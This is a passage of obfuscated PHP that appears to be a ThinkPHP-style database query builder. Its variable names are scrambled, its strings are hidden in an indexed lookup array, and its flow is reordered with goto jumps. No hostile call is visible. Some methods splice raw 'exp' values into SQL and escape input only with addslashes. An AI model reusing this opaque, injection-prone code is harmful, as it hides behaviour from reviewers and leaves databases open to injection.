$D¢ã«È‘¼[50] . $this->parseKey($b ­ÈôŞã); } else { $f„ ƒ‘Ú‘¿[] = $this->parseKey($cã¢¨¨óË); } } $AÂçˆ“Åóƒ = $f„ ƒ‘Ú‘¿; } elseif (is_string($AÂçˆ“Åóƒ)) { if (strstr($AÂçˆ“Åóƒ, $D¢ã«È‘¼[50])) { return $AÂçˆ“Åóƒ; } $AÂçˆ“Åóƒ = explode($D¢ã«È‘¼[47], $AÂçˆ“Åóƒ); array_walk($AÂçˆ“Åóƒ, array($this, $D¢ã«È‘¼[854])); } return $D¢ã«È‘¼[848] . trim(implode($D¢ã«È‘¼[944], $AÂçˆ“Åóƒ), $D¢ã«È‘¼[381]) . $D¢ã«È‘¼[848]; } protected function parseWhere($A‘¹”®¡ƒá) { $FÃî‘†–° =& $_SERVER[Šº]; $d¬©ñœÊ¹ = $FÃî‘†–°[33]; if (is_string($A‘¹”®¡ƒá)) { $d¬©ñœÊ¹ = $A‘¹”®¡ƒá; } else { $e‰œ‚ƒ•† = isset($A‘¹”®¡ƒá[$FÃî‘†–°[945]]) ? strtoupper($A‘¹”®¡ƒá[$FÃî‘†–°[945]]) : $FÃî‘†–°[33]; if (in_array($e‰œ‚ƒ•†, array($FÃî‘†–°[946], $FÃî‘†–°[947], $FÃî‘†–°[948]))) { $e‰œ‚ƒ•† = $FÃî‘†–°[50] . $e‰œ‚ƒ•† . $FÃî‘†–°[50]; unset($A‘¹”®¡ƒá[$FÃî‘†–°[945]]); } else { $e‰œ‚ƒ•† = $FÃî‘†–°[949]; } foreach ($A‘¹”®¡ƒá as $CáÈ­”Ÿº => $DÒ˜œÎ”Š‰) { $d¬©ñœÊ¹ .= $FÃî‘†–°[274]; if (is_numeric($CáÈ­”Ÿº)) { $CáÈ­”Ÿº = $FÃî‘†–°[950]; } if (0 === strpos($CáÈ­”Ÿº, $FÃî‘†–°[71])) { $d¬©ñœÊ¹ .= $this->parseThinkWhere($CáÈ­”Ÿº, $DÒ˜œÎ”Š‰); } else { if (!preg_match($FÃî‘†–°[951], trim($CáÈ­”Ÿº))) { think_exception(think_lang($FÃî‘†–°[952]) . $FÃî‘†–°[4] . $CáÈ­”Ÿº); } $bÂš¥¦—ó´ = is_array($DÒ˜œÎ”Š‰) && isset($DÒ˜œÎ”Š‰[$FÃî‘†–°[953]]); $CáÈ­”Ÿº = trim($CáÈ­”Ÿº); if (strpos($CáÈ­”Ÿº, $FÃî‘†–°[280])) { $c‡Î®¡ƒÌõ = explode($FÃî‘†–°[280], $CáÈ­”Ÿº); $dô©¥¡¼Ñ÷ = array(); foreach ($c‡Î®¡ƒÌõ as $C—ïÖ†µ‘Á => $a™­·ášÖ„) { $AÂ“¼•‰ˆ  = $bÂš¥¦—ó´ ? $DÒ˜œÎ”Š‰[$C—ïÖ†µ‘Á] : $DÒ˜œÎ”Š‰; $dô©¥¡¼Ñ÷[] = $FÃî‘†–°[257] . $this->parseWhereItem($this->parseKey($a™­·ášÖ„), $AÂ“¼•‰ˆ ) . $FÃî‘†–°[853]; } $d¬©ñœÊ¹ .= implode($FÃî‘†–°[954], $dô©¥¡¼Ñ÷); } elseif (strpos($CáÈ­”Ÿº, $FÃî‘†–°[281])) { $c‡Î®¡ƒÌõ = explode($FÃî‘†–°[281], $CáÈ­”Ÿº); $dô©¥¡¼Ñ÷ = array(); foreach ($c‡Î®¡ƒÌõ as $C—ïÖ†µ‘Á => $a™­·ášÖ„) { $AÂ“¼•‰ˆ  = $bÂš¥¦—ó´ ? $DÒ˜œÎ”Š‰[$C—ïÖ†µ‘Á] : $DÒ˜œÎ”Š‰; $dô©¥¡¼Ñ÷[] = $FÃî‘†–°[257] . $this->parseWhereItem($this->parseKey($a™­·ášÖ„), $AÂ“¼•‰ˆ ) . $FÃî‘†–°[853]; } $d¬©ñœÊ¹ .= implode($FÃî‘†–°[949], $dô©¥¡¼Ñ÷); } else { $d¬©ñœÊ¹ .= $this->parseWhereItem($this->parseKey($CáÈ­”Ÿº), $DÒ˜œÎ”Š‰); } } $d¬©ñœÊ¹ .= $FÃî‘†–°[275] . $e‰œ‚ƒ•†; } $d¬©ñœÊ¹ = substr($d¬©ñœÊ¹, 0, -strlen($e‰œ‚ƒ•†)); } return empty($d¬©ñœÊ¹) ? $FÃî‘†–°[33] : $FÃî‘†–°[955] . $d¬©ñœÊ¹; } protected function parseWhereItem($Aç›ÄÜô”¬, $béÛ‚Á¢½î) { $dè¶é±›Á =& $_SERVER[Šº]; $D½¯Ñ³Â¯· = $dè¶é±›Á[33]; if (is_array($béÛ‚Á¢½î)) { if (is_string($béÛ‚Á¢½î[0])) { $FÊèŞäÍ§© = strtolower($béÛ‚Á¢½î[0]); if (in_array($béÛ‚Á¢½î[0], array($dè¶é±›Á[939], $dè¶é±›Á[956], $dè¶é±›Á[957], $dè¶é±›Á[958], $dè¶é±›Á[959], $dè¶é±›Á[960]))) { $D½¯Ñ³Â¯· .= $Aç›ÄÜô”¬ . $dè¶é±›Á[50] . $béÛ‚Á¢½î[0] . $dè¶é±›Á[50] . $this->parseValue($béÛ‚Á¢½î[1]); } elseif (preg_match($dè¶é±›Á[961], $béÛ‚Á¢½î[0])) { $D½¯Ñ³Â¯· .= $Aç›ÄÜô”¬ . $dè¶é±›Á[50] . $this->exp[$FÊèŞäÍ§©] . $dè¶é±›Á[50] . $this->parseValue($béÛ‚Á¢½î[1]); } elseif (preg_match($dè¶é±›Á[962], $béÛ‚Á¢½î[0])) { if (is_array($béÛ‚Á¢½î[1])) { $f«›”¸Âß = isset($béÛ‚Á¢½î[2]) ? strtoupper($béÛ‚Á¢½î[2]) : $dè¶é±›Á[947]; if (in_array($f«›”¸Âß, array($dè¶é±›Á[946], $dè¶é±›Á[947], $dè¶é±›Á[948]))) { $dªİÕŒåê = array(); foreach ($béÛ‚Á¢½î[1] as $aËÈº³ò‹ß) { $dªİÕŒåê[] = $Aç›ÄÜô”¬ . $dè¶é±›Á[50] . $this->exp[$FÊèŞäÍ§©] . $dè¶é±›Á[50] . $this->parseValue($aËÈº³ò‹ß); } $D½¯Ñ³Â¯· .= $dè¶é±›Á[257] . implode($dè¶é±›Á[50] . $f«›”¸Âß . $dè¶é±›Á[50], $dªİÕŒåê) . $dè¶é±›Á[853]; } } else { $D½¯Ñ³Â¯· .= $Aç›ÄÜô”¬ . $dè¶é±›Á[50] . $this->exp[$FÊèŞäÍ§©] . $dè¶é±›Á[50] . $this->parseValue($béÛ‚Á¢½î[1]); } } elseif ($dè¶é±›Á[294] == $FÊèŞäÍ§©) { $D½¯Ñ³Â¯· .= $dè¶é±›Á[851] . $Aç›ÄÜô”¬ . $dè¶é±›Á[50] . $béÛ‚Á¢½î[1] . $dè¶é±›Á[963]; } elseif (preg_match($dè¶é±›Á[964], $béÛ‚Á¢½î[0])) { $D½¯Ñ³Â¯· .= $béÛ‚Á¢½î[0]; } elseif (preg_match($dè¶é±›Á[965], $béÛ‚Á¢½î[0])) { if (isset($béÛ‚Á¢½î[2]) && $dè¶é±›Á[294] == $béÛ‚Á¢½î[2]) { $D½¯Ñ³Â¯· .= $Aç›ÄÜô”¬ . $dè¶é±›Á[50] . $this->exp[$FÊèŞäÍ§©] . $dè¶é±›Á[50] . $béÛ‚Á¢½î[1]; } else { if (is_string($béÛ‚Á¢½î[1])) { $béÛ‚Á¢½î[1] = explode($dè¶é±›Á[47], $béÛ‚Á¢½î[1]); } $Fá‹¡êîäğ = implode($dè¶é±›Á[47], $this->parseValue($béÛ‚Á¢½î[1])); $D½¯Ñ³Â¯· .= $Aç›ÄÜô”¬ . $dè¶é±›Á[50] . $this->exp[$FÊèŞäÍ§©] . $dè¶é±›Á[851] . $Fá‹¡êîäğ . $dè¶é±›Á[853]; } } elseif (preg_match($dè¶é±›Á[966], $béÛ‚Á¢½î[0])) { $fëğáñÅµƒ = is_string($béÛ‚Á¢½î[1]) ? explode($dè¶é±›Á[47], $béÛ‚Á¢½î[1]) : $béÛ‚Á¢½î[1]; $D½¯Ñ³Â¯· .= $dè¶é±›Á[851] . $Aç›ÄÜô”¬ . $dè¶é±›Á[50] . $this->exp[$FÊèŞäÍ§©] . $dè¶é±›Á[50] . $this->parseValue($fëğáñÅµƒ[0]) . $dè¶é±›Á[949] . $this->parseValue($fëğáñÅµƒ[1]) . $dè¶é±›Á[275]; } else { think_exception(think_lang($dè¶é±›Á[952]) . $dè¶é±›Á[4] . $béÛ‚Á¢½î[0]); } } else { $FÈ¬¿”Ûçò = count($béÛ‚Á¢½î); $CÁ¿µÑÊÁ = $dè¶é±›Á[33]; if (is_string($béÛ‚Á¢½î[$FÈ¬¿”Ûçò - 1])) { $CÁ¿µÑÊÁ = isset($béÛ‚Á¢½î[$FÈ¬¿”Ûçò - 1]) ? strtoupper($béÛ‚Á¢½î[$FÈ¬¿”Ûçò - 1]) : $dè¶é±›Á[33]; if (in_array($CÁ¿µÑÊÁ, array($dè¶é±›Á[946], $dè¶é±›Á[947], $dè¶é±›Á[948]))) { $FÈ¬¿”Ûçò = $FÈ¬¿”Ûçò - 1; } } else { $CÁ¿µÑÊÁ = $dè¶é±›Á[946]; } for ($dÂåºŒÄª = 0; $dÂåºŒÄª < $FÈ¬¿”Ûçò; $dÂåºŒÄª++) { $fëğáñÅµƒ = is_array($béÛ‚Á¢½î[$dÂåºŒÄª]) ? $béÛ‚Á¢½î[$dÂåºŒÄª][1] : $béÛ‚Á¢½î[$dÂåºŒÄª]; if ($dè¶é±›Á[294] == strtolower($béÛ‚Á¢½î[$dÂåºŒÄª][0])) { $D½¯Ñ³Â¯· .= $dè¶é±›Á[257] . $Aç›ÄÜô”¬ . $dè¶é±›Á[50] . $fëğáñÅµƒ . $dè¶é±›Á[963] . $CÁ¿µÑÊÁ . $dè¶é±›Á[50]; } else { $b¼“ŒœØå = is_array($béÛ‚Á¢½î[$dÂåºŒÄª]) ? $this->exp[strtolower($béÛ‚Á¢½î[$dÂåºŒÄª][0])] : $dè¶é±›Á[939]; if (!$b¼“ŒœØå && is_array($béÛ‚Á¢½î[$dÂåºŒÄª]) && in_array($béÛ‚Á¢½î[$dÂåºŒÄª][0], array($dè¶é±›Á[939], $dè¶é±›Á[956], $dè¶é±›Á[957], $dè¶é±›Á[958], $dè¶é±›Á[959], $dè¶é±›Á[960]))) { $b¼“ŒœØå = $béÛ‚Á¢½î[$dÂåºŒÄª][0]; } $D½¯Ñ³Â¯· .= $dè¶é±›Á[257] . $Aç›ÄÜô”¬ . $dè¶é±›Á[50] . $b¼“ŒœØå . $dè¶é±›Á[50] . $this->parseValue($fëğáñÅµƒ) . $dè¶é±›Á[963] . $CÁ¿µÑÊÁ . $dè¶é±›Á[50]; } } $D½¯Ñ³Â¯· = substr($D½¯Ñ³Â¯·, 0, -4); } } else { $D½¯Ñ³Â¯· .= $Aç›ÄÜô”¬ . $dè¶é±›Á[967] . $this->parseValue($béÛ‚Á¢½î); } return $D½¯Ñ³Â¯·; } protected function parseThinkWhere($D÷Û–ø¼ù, $aâ°æ²Ì­¬) { $dêÎÍ¤õ¿‡ =& $_SERVER[Šº]; $E–øˆöä¢ˆ = $dêÎÍ¤õ¿‡[33]; switch ($D÷Û–ø¼ù) { case $dêÎÍ¤õ¿‡[349]: $E–øˆöä¢ˆ = $aâ°æ²Ì­¬; break; case $dêÎÍ¤õ¿‡[950]: $E–øˆöä¢ˆ = is_string($aâ°æ²Ì­¬) ? $aâ°æ²Ì­¬ : substr($this->parseWhere($aâ°æ²Ì­¬), 6); break; case $dêÎÍ¤õ¿‡[968]: parse_str($aâ°æ²Ì­¬, $EŸª¶±Òø¯); if (isset($EŸª¶±Òø¯[$dêÎÍ¤õ¿‡[945]])) { $C°¸¯ÜÜ„± = $dêÎÍ¤õ¿‡[50] . strtoupper($EŸª¶±Òø¯[$dêÎÍ¤õ¿‡[945]]) . $dêÎÍ¤õ¿‡[50]; unset($EŸª¶±Òø¯[$dêÎÍ¤õ¿‡[945]]); } else { $C°¸¯ÜÜ„± = $dêÎÍ¤õ¿‡[949]; } $bÙ÷Ÿˆ£è± = array(); foreach ($EŸª¶±Òø¯ as $d¾ªÊëË¡ß => $AÈÏ³›‘å) { $bÙ÷Ÿˆ£è±[] = $this->parseKey($d¾ªÊëË¡ß) . $dêÎÍ¤õ¿‡[967] . $this->parseValue($AÈÏ³›‘å); } $E–øˆöä¢ˆ = implode($C°¸¯ÜÜ„±, $bÙ÷Ÿˆ£è±); break; } return $E–øˆöä¢ˆ; } protected function parseLimit($F¹öšÀ…Ëî) { $aáµÇš¯äÔ =& $_SERVER[Šº]; return !empty($F¹öšÀ…Ëî) ? $aáµÇš¯äÔ[48] . $F¹öšÀ…Ëî . $aáµÇš¯äÔ[50] : $aáµÇš¯äÔ[33]; } protected function parseJoin($d™‚½²Ï¦Â) { $dŠĞØöõõ¤ =& $_SERVER[Šº]; $A…ğ±Ì¢àà = $dŠĞØöõõ¤[33]; if (!empty($d™‚½²Ï¦Â)) { if (is_array($d™‚½²Ï¦Â)) { foreach ($d™‚½²Ï¦Â as $d¯å£Üº† => $fƒòğˆÑ„…) { if (!1 !== stripos($fƒòğˆÑ„…, $dŠĞØöõõ¤[969])) { $A…ğ±Ì¢àà .= $dŠĞØöõõ¤[50] . $fƒòğˆÑ„…; } else { $A…ğ±Ì¢àà .= $dŠĞØöõõ¤[970] . $fƒòğˆÑ„…; } } } else { $A…ğ±Ì¢àà .= $dŠĞØöõõ¤[970] . $d™‚½²Ï¦Â; } } $A…ğ±Ì¢àà = preg_replace($dŠĞØöõõ¤[971], think_config($dŠĞØöõõ¤[877]) . $dŠĞØöõõ¤[972], $A…ğ±Ì¢àà); return $A…ğ±Ì¢àà; } protected function parseOrder($BğİÍ¼–—â) { $dä˜Ş†£‚ =& $_SERVER[Šº]; if (is_array($BğİÍ¼–—â)) { $EµÇ§˜”ãø = array(); foreach ($BğİÍ¼–—â as $A‚ˆÂ¾ƒÑ => $c‘ó†ÔÉ‡ù) { if (is_numeric($A‚ˆÂ¾ƒÑ)) { $EµÇ§˜”ãø[] = $this->parseKey($c‘ó†ÔÉ‡ù); } else { $c‘ó†ÔÉ‡ù = in_array(strtoupper(trim($c‘ó†ÔÉ‡ù)), array($dä˜Ş†£‚[973], $dä˜Ş†£‚[974])) ? $dä˜Ş†£‚[50] . $c‘ó†ÔÉ‡ù : $dä˜Ş†£‚[33]; if (preg_match($dä˜Ş†£‚[975], $A‚ˆÂ¾ƒÑ)) { $EµÇ§˜”ãø[] = $this->parseKey($A‚ˆÂ¾ƒÑ) . $c‘ó†ÔÉ‡ù; } else { think_exception($dä˜Ş†£‚[976] . $A‚ˆÂ¾ƒÑ); } } } $BğİÍ¼–—â = implode($dä˜Ş†£‚[47], $EµÇ§˜”ãø); } return !empty($BğİÍ¼–—â) ? $dä˜Ş†£‚[977] . $BğİÍ¼–—â : $dä˜Ş†£‚[33]; } protected function parseGroup($b¿î’é½Ö) { $FÖïÔ™ßÔô =& $_SERVER[Šº]; return !empty($b¿î’é½Ö) ? $FÖïÔ™ßÔô[978] . $b¿î’é½Ö : $FÖïÔ™ßÔô[33]; } protected function parseHaving($A‘ÈÉ­»¬) { $Bˆ´Í¸ÚÁä =& $_SERVER[Šº]; return !empty($A‘ÈÉ­»¬) ? $Bˆ´Í¸ÚÁä[979] . $A‘ÈÉ­»¬ : $Bˆ´Í¸ÚÁä[33]; } protected function parseComment($aŸ¯“™«£ï) { $eÆÈÁ„šĞÃ =& $_SERVER[Šº]; return !empty($aŸ¯“™«£ï) ? $eÆÈÁ„šĞÃ[980] . $aŸ¯“™«£ï . $eÆÈÁ„šĞÃ[981] : $eÆÈÁ„šĞÃ[33]; } protected function parseDistinct($e«íÕ¦ä‹) { $D‡ÖÎ‘’ Í =& $_SERVER[Šº]; return !empty($e«íÕ¦ä‹) ? $D‡ÖÎ‘’ Í[982] : $D‡ÖÎ‘’ Í[33]; } protected function parseUnion($BÙõ†Àá›Ï) { $e›é’ñÁîÛ =& $_SERVER[Šº]; if (empty($BÙõ†Àá›Ï)) { return $e›é’ñÁîÛ[33]; } if (isset($BÙõ†Àá›Ï[$e›é’ñÁîÛ[345]])) { $dŞòç…¨†ä = $e›é’ñÁîÛ[983]; unset($BÙõ†Àá›Ï[$e›é’ñÁîÛ[345]]); } else { $dŞòç…¨†ä = $e›é’ñÁîÛ[984]; } foreach ($BÙõ†Àá›Ï as $a„ò‡ÍÃÃÙ) { $B‚çŞĞ×[] = $dŞòç…¨†ä . (is_array($a„ò‡ÍÃÃÙ) ? $this->buildSelectSql($a„ò‡ÍÃÃÙ) : $a„ò‡ÍÃÃÙ); } return implode($e›é’ñÁîÛ[50], $B‚çŞĞ×); } public function insert($B„×ÏøÁ—ï, $f²²ÏŸò” = array(), $Bø—ÅêÑ± = false) { goto A÷å¥Â“÷; EØ¿ìÍÛà°: foreach ($B„×ÏøÁ—ï as $CóŒÀŠ”ò => $c—­¾—Éœò) { if (is_array($c—­¾—Éœò) && $aø„ê¥İÃ½[294] == $c—­¾—Éœò[0]) { $E±Ä„Ğæ·[] = $this->parseKey($CóŒÀŠ”ò); $fÒã¾İĞÙ[] = $c—­¾—Éœò[1]; } elseif (is_scalar($c—­¾—Éœò) || is_null($c—­¾—Éœò)) { $E±Ä„Ğæ·[] = $this->parseKey($CóŒÀŠ”ò); $fÒã¾İĞÙ[] = $this->parseValue($c—­¾—Éœò); } } $e¥á§”¨ËÓ = ($Bø—ÅêÑ± ? $aø„ê¥İÃ½[855] : $aø„ê¥İÃ½[856]) . $aø„ê¥İÃ½[857] . $this->parseTable($f²²ÏŸò”[$aø„ê¥İÃ½[276]]) . $aø„ê¥İÃ½[851] . implode($aø„ê¥İÃ½[47], $E±Ä„Ğæ·) . $aø„ê¥İÃ½[852] . implode($aø„ê¥İÃ½[47], $fÒã¾İĞÙ) . $aø„ê¥İÃ½[853]; $e¥á§”¨ËÓ .= $this->parseLock(isset($f²²ÏŸò”[$aø„ê¥İÃ½[810]]) ? $f²²ÏŸò”[$aø„ê¥İÃ½[810]] : !1); goto cÀ‘¢´°ù; cÀ‘¢´°ù: $e¥á§”¨ËÓ .= $this->parseComment(!empty($f²²ÏŸò”[$aø„ê¥İÃ½[351]]) ? $f²²ÏŸò”[$aø„ê¥İÃ½[351]] : $aø„ê¥İÃ½[33]); return $this->execute($e¥á§”¨ËÓ, $this->parseBind(!empty($f²²ÏŸò”[$aø„ê¥İÃ½[282]]) ? $f²²ÏŸò”[$aø„ê¥İÃ½[282]] : array())); goto eğÒ…Ğã‡ğ; A÷å¥Â“÷: $aø„ê¥İÃ½ =& $_SERVER[Šº]; $fÒã¾İĞÙ = $E±Ä„Ğæ· = array(); $this->model = $f²²ÏŸò”[$aø„ê¥İÃ½[278]]; goto EØ¿ìÍÛà°; eğÒ…Ğã‡ğ: } public function selectInsert($b±™å‰ß», $FŠ’î˜Àô, $bå¶Èó‰ = array()) { goto Ešç†ã§ÚÈ; Ešç†ã§ÚÈ: $C«Ü‘ë„¢¸ =& $_SERVER[Šº]; $this->model = $bå¶Èó‰[$C«Ü‘ë„¢¸[278]]; if (is_string($b±™å‰ß»)) { $b±™å‰ß» = explode($C«Ü‘ë„¢¸[47], $b±™å‰ß»); } goto Fâœªóê±; C¶Š…‚¤: return $this->execute($F¸‚³¹‡Áå, $this->parseBind(!empty($bå¶Èó‰[$C«Ü‘ë„¢¸[282]]) ? $bå¶Èó‰[$C«Ü‘ë„¢¸[282]] : array())); goto FİçÑ¦ÉÈ; Fâœªóê±: array_walk($b±™å‰ß», array($this, $C«Ü‘ë„¢¸[854])); $F¸‚³¹‡Áå = $C«Ü‘ë„¢¸[985] . $this->parseTable($FŠ’î˜Àô) . $C«Ü‘ë„¢¸[851] . implode($C«Ü‘ë„¢¸[47], $b±™å‰ß») . $C«Ü‘ë„¢¸[963]; $F¸‚³¹‡Áå .= $this->buildSelectSql($bå¶Èó‰); goto C¶Š…‚¤; FİçÑ¦ÉÈ: } public function update($A¬·‘Éˆã, $b‹ˆƒ§ˆ¤è) { $a…ù«Ü„³ñ =& $_SERVER[Šº]; $this->model = $b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[278]]; $E¤ñ±ºÍÌƒ = $a…ù«Ü„³ñ[986] . $this->parseTable($b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[276]]) . $this->parseSet($A¬·‘Éˆã) . $this->parseWhere(!empty($b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[272]]) ? $b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[272]] : $a…ù«Ü„³ñ[33]) . $this->parseOrder(!empty($b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[362]]) ? $b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[362]] : $a…ù«Ü„³ñ[33]) . $this->parseLimit(!empty($b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[289]]) ? $b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[289]] : $a…ù«Ü„³ñ[33]) . $this->parseLock(isset($b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[810]]) ? $b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[810]] : !1) . $this->parseComment(!empty($b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[351]]) ? $b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[351]] : $a…ù«Ü„³ñ[33]); return $this->execute($E¤ñ±ºÍÌƒ, $this->parseBind(!empty($b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[282]]) ? $b‹ˆƒ§ˆ¤è[$a…ù«Ü„³ñ[282]] : array())); } public function delete($Eîº»£Šïî = array()) { $aÖ›Ùõ¶» =& $_SERVER[Šº]; $this->model = $Eîº»£Šïî[$aÖ›Ùõ¶»[278]]; $eÀîÃ¸÷ï„ = $aÖ›Ùõ¶»[987] . $this->parseTable($Eîº»£Šïî[$aÖ›Ùõ¶»[276]]) . $this->parseWhere(!empty($Eîº»£Šïî[$aÖ›Ùõ¶»[272]]) ? $Eîº»£Šïî[$aÖ›Ùõ¶»[272]] : $aÖ›Ùõ¶»[33]) . $this->parseOrder(!empty($Eîº»£Šïî[$aÖ›Ùõ¶»[362]]) ? $Eîº»£Šïî[$aÖ›Ùõ¶»[362]] : $aÖ›Ùõ¶»[33]) . $this->parseLimit(!empty($Eîº»£Šïî[$aÖ›Ùõ¶»[289]]) ? $Eîº»£Šïî[$aÖ›Ùõ¶»[289]] : $aÖ›Ùõ¶»[33]) . $this->parseLock(isset($Eîº»£Šïî[$aÖ›Ùõ¶»[810]]) ? $Eîº»£Šïî[$aÖ›Ùõ¶»[810]] : !1) . $this->parseComment(!empty($Eîº»£Šïî[$aÖ›Ùõ¶»[351]]) ? $Eîº»£Šïî[$aÖ›Ùõ¶»[351]] : $aÖ›Ùõ¶»[33]); return $this->execute($eÀîÃ¸÷ï„, $this->parseBind(!empty($Eîº»£Šïî[$aÖ›Ùõ¶»[282]]) ? $Eîº»£Šïî[$aÖ›Ùõ¶»[282]] : array())); } public function select($DŠœ¤‰£ï = array()) { goto eÂ¼ÊñªÒ; eÂ¼ÊñªÒ: $AŞèñÎÁÃ =& $_SERVER[Šº]; $this->model = $DŠœ¤‰£ï[$AŞèñÎÁÃ[278]]; $bİ¹©¸µÀ = $this->buildSelectSql($DŠœ¤‰£ï); goto D¯à‚îÙŒñ; a„“™ŠÂµÕ: if ($Eµ¤ï©‹ì && !1 !== $bĞÔáá¿¾’) { think_cache($f’ ½ŸùáŒ, $bĞÔáá¿¾’, $Eµ¤ï©‹ì); } return $bĞÔáá¿¾’; goto cÏ™ĞÏƒ‡; D¯à‚îÙŒñ: $Eµ¤ï©‹ì = isset($DŠœ¤‰£ï[$AŞèñÎÁÃ[346]]) ? $DŠœ¤‰£ï[$AŞèñÎÁÃ[346]] : !1; if ($Eµ¤ï©‹ì) { $f’ ½ŸùáŒ = is_string($Eµ¤ï©‹ì[$AŞèñÎÁÃ[93]]) ? $Eµ¤ï©‹ì[$AŞèñÎÁÃ[93]] : $AŞèñÎÁÃ[988] . md5($bİ¹©¸µÀ); $då¿©ĞøŒ² = think_cache($f’ ½ŸùáŒ, $AŞèñÎÁÃ[33], $Eµ¤ï©‹ì); if (!1 !== $då¿©ĞøŒ²) { return $då¿©ĞøŒ²; } } $bĞÔáá¿¾’ = $this->query($bİ¹©¸µÀ, $this->parseBind(!empty($DŠœ¤‰£ï[$AŞèñÎÁÃ[282]]) ? $DŠœ¤‰£ï[$AŞèñÎÁÃ[282]] : array())); goto a„“™ŠÂµÕ; cÏ™ĞÏƒ‡: } public function buildSelectSql($D î—öÔë¢ = array()) { goto dğ±Ôî‘Ê; dğ±Ôî‘Ê: $eá÷é¤‹‚™ =& $_SERVER[Šº]; if (isset($D î—öÔë¢[$eá÷é¤‹‚™[350]])) { if (strpos($D î—öÔë¢[$eá÷é¤‹‚™[350]], $eá÷é¤‹‚™[47])) { list($CñÕ¬ğĞ÷„, $D°Ìâ­³) = explode($eá÷é¤‹‚™[47], $D î—öÔë¢[$eá÷é¤‹‚™[350]]); } else { $CñÕ¬ğĞ÷„ = $D î—öÔë¢[$eá÷é¤‹‚™[350]]; } $CñÕ¬ğĞ÷„ = $CñÕ¬ğĞ÷„ ? $CñÕ¬ğĞ÷„ : 1; $D°Ìâ­³ = isset($D°Ìâ­³) ? $D°Ìâ­³ : (is_numeric($D î—öÔë¢[$eá÷é¤‹‚™[289]]) ? $D î—öÔë¢[$eá÷é¤‹‚™[289]] : 20); $eˆùßóÃÈµ = $D°Ìâ­³ * ((int) $CñÕ¬ğĞ÷„ - 1); $D î—öÔë¢[$eá÷é¤‹‚™[289]] = $eˆùßóÃÈµ . $eá÷é¤‹‚™[47] . $D°Ìâ­³; } if (think_config($eá÷é¤‹‚™[989])) { $C¢ĞˆÙÆ®Œ = $eá÷é¤‹‚™[990] . md5(serialize($D î—öÔë¢)); $f‡ƒ»ãë¹ = think_cache($C¢ĞˆÙÆ®Œ); if ($f‡ƒ»ãë¹) { return $f‡ƒ»ãë¹; } } goto fìáÉ¾ùÛ; fìáÉ¾ùÛ: $Fªí¿´“µÚ = $this->parseSql($this->selectSql, $D î—öÔë¢); $Fªí¿´“µÚ .= $this->parseLock(isset($D î—öÔë¢[$eá÷é¤‹‚™[810]]) ? $D î—öÔë¢[$eá÷é¤‹‚™[810]] : !1); if (isset($C¢ĞˆÙÆ®Œ)) { think_cache($C¢ĞˆÙÆ®Œ, $Fªí¿´“µÚ); } goto Eƒ†ìç³ï˜; Eƒ†ìç³ï˜: return $Fªí¿´“µÚ; goto EÏ”’îÚ™; EÏ”’îÚ™: } public function parseSql($C£‹’Ñ‡å, $f‡ÕÍÌä = array()) { $e”á§è„Õ˜ =& $_SERVER[Šº]; $C£‹’Ñ‡å = str_replace(array($e”á§è„Õ˜[991], $e”á§è„Õ˜[992], $e”á§è„Õ˜[993], $e”á§è„Õ˜[994], $e”á§è„Õ˜[995], $e”á§è„Õ˜[996], $e”á§è„Õ˜[997], $e”á§è„Õ˜[998], $e”á§è„Õ˜[999], $e”á§è„Õ˜[1000], $e”á§è„Õ˜[1001]), array($this->parseTable("{$f‡ÕÍÌä[$e”á§è„Õ˜[276]]}"), $this->parseDistinct(isset($f‡ÕÍÌä[$e”á§è„Õ˜[1002]]) ? $f‡ÕÍÌä[$e”á§è„Õ˜[1002]] : !1), $this->parseField(!empty($f‡ÕÍÌä[$e”á§è„Õ˜[270]]) ? $f‡ÕÍÌä[$e”á§è„Õ˜[270]] : $e”á§è„Õ˜[182]), $this->parseJoin(!empty($f‡ÕÍÌä[$e”á§è„Õ˜[279]]) ? $f‡ÕÍÌä[$e”á§è„Õ˜[279]] : $e”á§è„Õ˜[33]), $this->parseWhere(!empty($f‡ÕÍÌä[$e”á§è„Õ˜[272]]) ? $f‡ÕÍÌä[$e”á§è„Õ˜[272]] : $e”á§è„Õ˜[33]), $this->parseGroup(!empty($f‡ÕÍÌä[$e”á§è„Õ˜[1003]]) ? $f‡ÕÍÌä[$e”á§è„Õ˜[1003]] : $e”á§è„Õ˜[33]), $this->parseHaving(!empty($f‡ÕÍÌä[$e”á§è„Õ˜[1004]]) ? $f‡ÕÍÌä[$e”á§è„Õ˜[1004]] : $e”á§è„Õ˜[33]), $this->parseOrder(!empty($f‡ÕÍÌä[$e”á§è„Õ˜[362]]) ? $f‡ÕÍÌä[$e”á§è„Õ˜[362]] : $e”á§è„Õ˜[33]), $this->parseLimit(!empty($f‡ÕÍÌä[$e”á§è„Õ˜[289]]) ? $f‡ÕÍÌä[$e”á§è„Õ˜[289]] : $e”á§è„Õ˜[33]), $this->parseUnion(!empty($f‡ÕÍÌä[$e”á§è„Õ˜[344]]) ? $f‡ÕÍÌä[$e”á§è„Õ˜[344]] : $e”á§è„Õ˜[33]), $this->parseComment(!empty($f‡ÕÍÌä[$e”á§è„Õ˜[351]]) ? $f‡ÕÍÌä[$e”á§è„Õ˜[351]] : $e”á§è„Õ˜[33])), $C£‹’Ñ‡å); return $C£‹’Ñ‡å; } public function getLastSql($eÄ–¥ë“ƒ» = '') { return $eÄ–¥ë“ƒ» ? $this->modelSql[$eÄ–¥ë“ƒ»] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($B–‘ÍÂõ¦) { return addslashes($B–‘ÍÂõ¦); } public function setModel($E©ÉôÇ±ŠŠ) { $this->model = $E©ÉôÇ±ŠŠ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Aîù›‡›øˆ, $bä¹ğ§å½‹ = '') { $this->database = 